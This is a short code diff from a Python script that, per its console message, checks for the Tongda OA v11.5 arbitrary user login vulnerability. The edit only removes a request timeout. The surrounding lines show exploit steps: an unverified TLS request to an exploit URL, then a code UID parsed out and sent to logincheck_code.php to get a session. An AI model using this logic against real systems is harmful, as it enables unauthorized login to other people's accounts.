@@ -23,7 +23,7 @@ def main(target_url):
     console.print(now_time() + " [INFO]     正在检测通达OA_v11.5_任意用户登录漏洞", style='bold blue')
     try:
         requests.packages.urllib3.disable_warnings()
-        response = requests.get(url=exp_url, headers=headers, verify=False, timeout=15)
+        response = requests.get(url=exp_url, headers=headers, verify=False)
         responseText = str(response.text).split('{')
         codeUid = responseText[-1].replace('}"}', '').replace('\r\n', '')
         getSessUrl = target_url+'logincheck_code.php'
